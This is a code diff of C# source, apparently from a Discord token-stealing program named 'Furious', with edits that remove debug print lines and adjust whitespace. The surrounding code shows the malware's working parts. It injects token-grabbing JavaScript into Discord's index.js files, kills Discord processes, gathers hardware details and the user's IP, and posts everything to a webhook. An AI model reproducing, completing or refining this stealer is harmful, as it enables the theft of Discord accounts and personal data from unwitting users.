@@ -44,7 +44,6 @@ namespace Furious
 					Environment.Exit(0);
 			}
 			if (injectJS)
-				Console.WriteLine("CUM");
 				CloseProcesses();
 			if (getUserHardware)
 				await SendData(await GetHardware());
@@ -52,7 +51,7 @@ namespace Furious
 
 		///This method is used to write the token grabbing JavaScript code into the Discord directory.
 		public static async Task InjectJS()
-        {
+        	{
 			if (Directory.Exists(@"C:\Users\" + Environment.UserName + @"\AppData\Roaming\discord"))
 			{
 				string[] discord = Directory.GetDirectories(@"C:\Users\" + Environment.UserName + @"\AppData\Roaming\discord");
@@ -88,13 +87,12 @@ namespace Furious
 					{
 						FileManagement.CanaryPath = folderName + @"\modules\discord_modules\index.js";
 						await FileManagement.CleanFile(FileManagement.CanaryPath);
-                        await FileManagement.WriteDiscord(FileManagement.CanaryPath);
+                        			await FileManagement.WriteDiscord(FileManagement.CanaryPath);
 					}
 				}
 			}
 			if (Directory.Exists(@"C:\Users\" + Environment.UserName + @"\AppData\Roaming\discorddevelopment"))
 			{
-				Console.WriteLine("FOUND DEV");
 				string[] dev = Directory.GetDirectories(@"C:\Users\" + Environment.UserName + @"\AppData\Roaming\discorddevelopment");
 				foreach (string folderName in dev)
 				{
@@ -115,7 +113,7 @@ namespace Furious
 			Process.GetProcesses().Where(p => p.ProcessName.Contains("discord")).ToList().ForEach(y => y.Kill());
 
 			await InjectJS();
-        }
+        	}
 
 		///This method collects the users hardware specifications which can be sent to a webhook using the SendData method.
 		public static async Task<string> GetHardware()
@@ -133,9 +131,9 @@ namespace Furious
 					sb.AppendLine($"GPU: {obj["Name"]}");
 				}
 				foreach (ManagementObject obj in new ManagementObjectSearcher("select * from Win32_OperatingSystem").Get())
-                {
+                		{
 					sb.AppendLine($"OS: {obj["Caption"]}");
-                }
+                		}
 			});
 
 			Console.WriteLine(sb.ToString());
@@ -157,7 +155,7 @@ namespace Furious
 						{ "content", $"Data for '{ Environment.UserName }' @ { await GrabIP() }	```{ data }```" }
 					};
 
-                    response = await httpClient.PostAsync(hook, new FormUrlEncodedContent(contents));
+                    			response = await httpClient.PostAsync(hook, new FormUrlEncodedContent(contents));
 				}
 				catch (HttpRequestException ex)
 				{
